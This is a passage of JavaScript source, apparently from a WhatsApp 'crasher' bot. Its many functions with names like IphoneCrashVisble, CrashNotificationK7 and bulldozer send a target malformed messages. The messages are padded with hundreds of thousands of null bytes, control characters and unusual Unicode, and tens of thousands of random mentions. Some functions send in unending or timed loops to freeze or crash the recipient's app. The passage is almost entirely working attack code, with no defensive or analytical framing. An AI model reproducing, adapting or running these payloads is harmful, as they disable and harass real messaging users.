                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: Buffer.alloc(32, 0xff).toString('base64'),
                    fileLength: "999999999999",
                    height: 999999999,
                    width: 999999999,
                    mediaKey: Buffer.alloc(32, 0xff).toString('base64'),
                    fileEncSha256: Buffer.alloc(32, 0xff).toString('base64'),
                    directPath: "/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0",
                    mediaKeyTimestamp: Math.floor(Date.now() / 1000)
                  }
                },
                body: { text: m.substring(0, 50000) },
                nativeFlowMessage: {
                  buttons: [
                    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: m.substring(0, 30000), id: m.substring(0, 20000) }) },
                    { name: "call_permission_request", buttonParamsJson: JSON.stringify({ status: true }) }
                  ],
                  messageParamsJson: "{".repeat(50000)
                }
              })),
              messageVersion: 1
            },
            contextInfo: {
              participant: target,
              mentionedJid: Array.from({ length: 60000 }, () => Math.floor(Math.random() * 9000000) + 1 + "@s.whatsapp.net"),
              isForwarded: true,
              forwardingScore: 999999999,
              remoteJid: "status@broadcast",
              forwardedNewsletterMessageInfo: {
                newsletterJid: "supernova@newsletter",
                serverMessageId: 999999999999,
                newsletterName: m.substring(0, 200000),
                contentType: 3
              },
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Number.MAX_SAFE_INTEGER * 999
              },
              externalAdReply: {
                showAdAttribution: true,
                title: m.substring(0, 100000),
                body: m.substring(0, 200000),
                mediaType: 1,
                renderLargerThumbnail: true,
                thumbnailUrl: "https://files.catbox.moe/pif0jv.jpg"
              },
              messageSecret: Buffer.alloc(1000000, 0x00).toString('base64')
            }
          }
        }
      }
    };

    await sock.relayMessage(target, payload, {
      participant: { jid: target },
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: Array.from({ length: 60000 }, () => ({
                tag: "to",
                attrs: { jid: Math.floor(Math.random() * 9000000) + 1 + "@s.whatsapp.net" },
                content: []
              }))
            }
          ]
        }
      ]
    });

    for (let i = 0; i < 10; i++) {
      await sock.relayMessage("status@broadcast", payload, {
        messageId: "s_" + i,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
              }
            ]
          }
        ]
      });
      await new Promise(r => setTimeout(r, 50));
    }

    console.log(`✅ ComboxC1 TERKIRIM KE ${target}`);
  } catch (err) {
    console.error(`❌ Error: ${err.message}`);
  }
}

async function nomercyFciMGk7(sock, target) {
    const msg = {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
          mimetype: "image/jpeg",
          fileSha256: Buffer.from("qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=", "base64"),
          caption: "skylinne",
          fileLength: "149502",
          height: 1397,
          width: 1126,
          mediaKey: Buffer.from("5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=", "base64"),
          fileEncSha256: Buffer.from("XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=", "base64"),
          directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1777621571",
          jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=", "base64"),
          contextInfo: {
            pairedMediaType: "NOT_PAIRED_MEDIA",
            isQuestion: true,
            isGroupStatus: true
          },
          scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
          scanLengths: [2899999999999999077, 1799999999999998555, 7699999999999999148, 1069999999999999164],
          midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
        }
    };

    await sock.relayMessage(
        target,
        msg,
        {}
    );
}

async function IphoneCrashVisble(sock, target) {
  const NanMsg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: -9.09999262999,
          degreesLongitude: 199.99963118999,
          name: "(🍁) Skylinne Is Back?" + "𑇂𑆵𑆴𑆿".repeat(15000),
          url: `https://Skylinnereal${"𑇂𑆵𑆴𑆿".repeat(15000)}.com`,
          address: "\u0000" + "𑇂𑆵𑆴𑆿".repeat(15000),
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from(
                { length: 1900 },
                () => `1${Math.floor(Math.random() * 90000)}@s.whatsapp.net`
              )
            ],
            externalAdReply: {
              quotedAd: {
                advertiserName: "(🍁) Skylinne Is Back?" + "𑇂𑆵𑆴𑆿".repeat(15000),
                mediaType: "IMAGE",
                jpegThumbnail: null,
                caption: "\u0000" + "𑇂𑆵𑆴𑆿".repeat(15000)
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890"
              }
            }
          }
        }
      }
    }
  }, {});
  
  await sock.relayMessage(target, NanMsg, {
    messageId: null,
    participant: { jid: target },
    userJid: target
  });
}

async function DelayK7(sock, target) {
  await sock.sendMessage(target, {
    NativeFlowResponseMessage: {
      ButtonsResponseMessage: {
        groupStatusMessageV2: {
          interactiveMessage: {
            header: {
              title: "di sepele in trus"
            },
            body: {
              text: "\x10".repeat(500000)
            },
            nativeFlowMessage: {
              buttons: "\u001A".repeat(500000)
            }
          }
        }
      }
    },
    flowButtons: {
      buttons: Array.from({ length: 500 }, () => ({})),
      messageVersion: 999
    },
    body: {
      text: "\u0007".repeat(50000)
    }
  });
}

async function fcgb(sock, groupJid) {
    const MakLo = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: {
                    sources: []
                }
            }
        },
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 4,
                            tableMetadata: {
                                title: "p p apa",
                                rows: "\0",
                            }
                        }
                    ],
                    unifiedResponse: {
                        data: JSON.stringify({
                            response_id: crypto.randomUUID(),
                            sections: []
                        })
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "CRB"
                        },
                        forwardOrigin: 4
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(groupJid, MakLo, {});

    await sock.relayMessage(groupJid, msg.message, {
    messageId: msg.key.id
    });
}

async function bulldozer(sock, jid) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\x00"
                    },
                    nativeFlowMessage: {
                        buttons: "\x00".repeat(500000)
                    }
                }
            }
        }
    };

    await sock.relayMessage(jid, msg, { participant: true });
}

async function CrashNotificationK7(sock, target) {
    try {
        while (true) {
            const msg = generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            body: {
                                text: "GhostCrasher" + "ꦽ".repeat(50000) + "\u0000".repeat(50000)
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: "quick_reply",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "\u0000".repeat(10000),
                                            id: "video_call_crash"
                                        })
                                    },
                                    {
                                        name: "quick_reply",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "\u0000".repeat(10000),
                                            id: "voice_call_crash"
                                        })
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});

            await sock.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                noSelfSync: true
            });

            await sock.relayMessage(target, {
                callLogMessage: {
                    callId: Math.floor(Math.random() * 1e15).toString(),
                    isVideo: true,
                    callOutcome: "MISSED",
                    durationSecs: "0",
                    callType: "VIDEO_CALL",
                    participants: [
                        { jid: target, callOutcome: "MISSED" }
                    ]
                }
            }, { noSelfSync: true });

            await sock.relayMessage(target, {
                callLogMessage: {
                    callId: Math.floor(Math.random() * 1e15).toString(),
                    isVideo: false,
                    callOutcome: "REJECTED",
                    durationSecs: "0",
                    callType: "VOICE_CALL",
                    participants: [
                        { jid: target, callOutcome: "REJECTED" }
                    ]
                }
            }, { noSelfSync: true });

            await new Promise(resolve => setTimeout(resolve, 500));
        }
    } catch (err) {
        console.error("CRASH ANJ ERROR:", err);
    }
}

async function delayXcrasg(sock, target) {
    try {
        const msg = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "di sepelein trus"
                        },
                        nativeFlowMessage: {
                            buttons: "\u001A".repeat(500000)
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, msg, {});
        console.log("success send");
    } catch (err) {
        console.error("Error:", err);
    }
}

async function PahinaApple(sock, jid) {
  try {
    const msg = generateWAMessageFromContent(jid, {
      locationMessage: {
        name: "- # GhostCrash3r ん.? " + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
        address: "𑇂𑆵𑆴𑆿𑆿".repeat(15000)
      }
    }, {});
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id, statusJidList: [jid], additionalNodes: [{
        tag: "meta", attrs: {}, content: [{
          tag: "mentioned_users", attrs: {}, content: [{
            tag: "to", attrs: { jid: jid }, content: undefined
          }]
        }]
      }]
    });
  } catch (error) {
    console.log("error kontol: ", error);
  }
}

async function satz(sock, target) {
  for (let i = 0; i < 100; i++) {
    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: {
            extendedTextMessage: {
              text: "- # GhostCrash3r ん.? ",
              paymentLinkMetadata: {
                provider: {
                  paramsJson: "[{".repeat(80000)
                },
                header: {
                  headerType: 1
                },
                button: {
                  displayText: "Skylinne"
                }
              },
              contextInfo: {
featureEligibilities: Array.from({ length: 1000 }, () => ({
                canReceiveMultiReact: true
              })),
              isQuestion: true,
forwardedAiBotMessageInfo: {
                botJid: "867051314767696@bot"
              },
forwardingScore: 9999,
isForwarded: true,
mentionedJid: Array.from({ length: 1999 }, () => 
                            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                        ),
                remoteJid: "status@broadcast",
                quotedMessage: {
                  interactiveResponseMessage: {
                    body: {},
                    nativeFlowResponseMessage: {
                      name: "menu_options",
                      paramsJson: JSON.stringify({
                        display_text: "\u0000".repeat(90000),
                        description: "\u0000".repeat(9000),
                        id: "Satz"
                      }),
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      },
      {}
    );
  }
}


async function BlankClick(sock, target) {
  await sock.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "Skylinnereal",
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.9999999999999,
                name: " disepelein trus ",
                address: "X",
                jpegThumbnail: null,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "address_message",
                  buttonParamsJson: "[".repeat(5000),
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: "{".repeat(3888),
                },
              ],
              messageParamsJson: "Wa.me/stickerpack/zuki",
              messageVersion: 1,
            },
          },
        },
      },
    },
    { participant: { jid: target } },
  );

  await sock.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "X",
        name: "༘FxT‣" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        publisher: "༘Fxt‣" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        stickers: [
          {
            fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "fvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "fvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "fvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "fvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "fvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "fvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "fvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "fvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "fvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "fvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
        ],
        fileLength: "999999",
        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
        directPath:
          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
        contextInfo: {},
        packDescription: "GhostCrasher ༘‣" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        mediaKeyTimestamp: "1741150286",
        trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
        thumbnailDirectPath:
          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
        thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
        thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash:
          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
        stickerPackSize: "999999999",
        stickerPackOrigin: "1",
      },
    },
    {},
  );

  await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "Gonners",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_message",
              paramsJson: "\u0000".repeat(1000000),
              version: 2,
            },
          },
        },
      },
    },
    {
      participant: {
        jid: target,
      },
    },
  );
}

async function ExIOS(sock, target) {
await sock.relayMessage("status@broadcast", {
  extendedTextMessage: {
     text: "- # GhostCrash3r ん.? " + "𑇂𑆵𑆴𑆿".repeat(40000),
     matchedText: "https://t.me/ghostcrasher18", 
     jpegThumbnail: null, 
     previewType: 6,
       contextInfo: {
           mentionedJid: Array.from({ length: 512 }, (_, n) => `628${n + 725}@s.whatsapp.net`), 
           isForwarded: true, 
           forwardedNewsletterMessageInfo: {
            newsletterJid: "2111@newsletter", 
            newsletterName: "Fuck U", 
            serverMessageId: 7205
           }
         }
      }
    }, {
       statusJidList: [target],
       additionalNodes: [
          {
            tag: "meta",
            attrs: { status_setting: "contacts" },
            content: [
             {
              tag: "mentioned_users",
              attrs: {},
              content: [
               {
                tag: "to",
                attrs: { jid: target },
                content: []
               }
             ]
           }
         ]
       }
     ]
  });
}

async function XxNoX(sock, target) {
const CrBLock = {
interactiveMessage: {
body: {
text: "GhostCrasher"
},
nativeFlowMessage: {
buttons: Array.from({ length: 500000 }, () => ({}))
},
contextInfo: {
quotedMessage: {
contactMessage: {
displayName: "x",
vcard: null
},
},
},
},
};

const Crb = generateWAMessageFromContent(target, CrBLock, {});

await sock.relayMessage(target, Crb.message, {
messageId: Crb.key.id
})
}

async function LexcaabosV7Fix(sock, target) {
    const LexMsg = {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\u0000' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\u0000","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    };

    const Nanas = {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    mimetype: "video/mp4",
                    fileLength: "17381601",
                    title: "Skylinne - Executed",
                    fileName: " done bos " + "ꦽ".repeat(75000),
                    fileSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    mediaKey: "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2",
                    directPath: "/v/t62.7119-24/fake.enc",
                    mediaKeyTimestamp: "1767975195",
                    url: "https://mmg.whatsapp.net/d/fake.enc",
                    caption: "ꦾ".repeat(7000) + "ꦽ".repeat(7500)
                }
            }
        }
    };

    const Muda = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " Skylinne ni boss " + "ꦾ".repeat(7500)
                    },
                    contextInfo: {
                        stanzaId: "metawai_id",
                        forwardingScore: 999,
                        participant: target,
                        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                    }
                }
            }
        }
    };

    const stickers = {
        stickerMessage: {
            url: 'https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true',
            fileSha256: 'lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=',
            fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
            mediaKey: Buffer.alloc(32, '').toString('base64'),
            mimetype: "image/webp",
            height: -1,
            width: 5000,
            directPath: '/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0',
            fileLength: null,
            mediaKeyTimestamp: 1710000000,
            firstFrameLength: 999,
            firstFrameSidecar: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            isAnimated: true,
            pngThumbnail: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            contextInfo: {
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                ],
                interactiveAnnotations: [{
                    polygonVertices: [
                        { x: 0.1, y: 0.1 },
                        { x: 0.9, y: 0.1 },
                        { x: 0.9, y: 0.9 },
                        { x: 0.1, y: 0.9 }
                    ],
                    location: {
                        latitude: -6.2088,
                        longitude: 106.8456,
                        name: `Skylinnereal - Executed`,
                    }
                }]
            },
            stickerSentTs: 1710000000,
            isAvatar: true,
            isAiSticker: true,
            isLottie: true,
            accessibilityLabel: "\u0000".repeat(9000),
            mediaKeyDomain: null
        }
    };

    const msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            caption: "LexzyModss - Executed",
                            fileSha256: "umQsdlmP4w9dL35/1yb2Wy5x6ypLvSXUy3r7veQ/rNU=",
                            fileLength: "109951162777600",
                            height: -9999,
                            width: 9999,
                            mediaKey: "pbSAJfuBxe4QBnJO34YFyM1EX4ZABBJsmW6rhvT+5+I=",
                            fileEncSha256: "8frUJ7Tt5d1EXOSWiP/9CBdN4fP2gPV6WPE0sN/IaF4=",
                            directPath: "/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1774107894",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0Jdi1hZV1hYjX2Xe5t7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADs6unZ2+aFh/SINqdLCYSpYVKXczcHeKUGr56zGNgaDMfrkKJRqNSqkK6GqjWFw2MvVwxefqbzzDetQJykmZZwN7KAS4BCYFYBYAf/xAAmEAACAgICAgICAgMAAAAAAAAAAAABAgADBBESIQUxE0EQIhVRFDJS/9oACAEBAAE/AMZx8C6BOjHNh2FYLMahbcieZzONYpT84PlOKCi0dSyxa9LqIgLgkghjKwyWWUoQBuGtQG5sd77ImGUVbmXrrqZFr22HcowL7hvWhKfFy/xj8eSiVs708XHa9SmsF+J+hL8T43589bjltDl2NzJ+RrErrMxvGog5v2ZUyceh6lj8VY+v6ldqvXLslVyyn0ejHL41kvJrX5LDt/oRG+Zi1nUutejJDfUGUciv46tciJUl+OCbWEttpyGPK4CZF6Y1YFL8pWWtvUnskyvhcnxuNv8AUFjWW7vmPWtzitCSvszyZqNhrXrgJiPwLkWFSB1C92WKyDsp7luG23ts/QQHdJQAe/crc1uCJjX/ACD9Tpx6lVdOhtTzMtv/AMBgoHuZdy3Wl1ErPFgSOopUNyrfUf5LG/d4QtSnrZldDPx69mFUotRFPcw6BShutP7N6nljuxGgx2sr5IjbleFmH1SZX4jKPtZ/DP8Adgn8SmxzumXirTim2pvUx2L5CFjvuZFyktYf9Elu7q3sJ+9zG7xqihUfrNjiQ1qw34y7DXiPm4Ce7Y3lcEelYzL8ul1DVJVMRwl6kiZALoKgd/bS0fHUR/UF1oGg7AQW2f8AZhJJjqi8eLb67/NTcXBn/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=",
                            viewOnce: true,
                            scansSidecar: "ruEDZByywdU2+wxwAOMMI9TaQpJ84ehIk67v1KJjC+JGXu9u7ta4fw==",
                            scanLengths: [6677, 48757, 32501, 42353],
                            midQualityFileSha256: "qjGQcaOKUiN+pMKBMxAEeONhJR5VDFsu+iGxQ1LfmNY="
                        },
                        hasMediaAttachment: null
                    },
                    body: {
                        text: "\u0000".repeat(1000)
                    },
                    contextInfo: {
                        remoteJid: "status@broadcast",
                        participant: target,
                        isBuldo: true,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({ length: 1000 * 40 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
                        ],
                        groupMentions: [],
                        entryPointConversionSource: "non_contact",
                        entryPointConversionApp: "whatsapp",
                        entryPointConversionDelaySeconds: 467593,
                        quotedMessage: {
                            documentMessage: {
                                url: "https://example.com/file.zip",
                                mimetype: "application/zip",
                                caption: "Skylinne - Executed",
                                fileName: "GhostCrasher - Executed",
                                fileLength: 99999,
                                vCards: true
                            }
                        }
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "ြ".repeat(9000)
                    }
                }
            }
        }
    };

    await sock.relayMessage("status@broadcast", Nanas, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", Muda, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    const startTime = Date.now();
    const duration = 5 * 60 * 1500;

    while (Date.now() - startTime < duration) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0000".repeat(75000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { participant: target });
    }

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            nativeFlowMessage: {
                extendedTextMessage: {
                    text: "\u0003".repeat(9000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 1999 },
                                () => "1" + Math.floor(Math.random() * 98000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { participant: target });

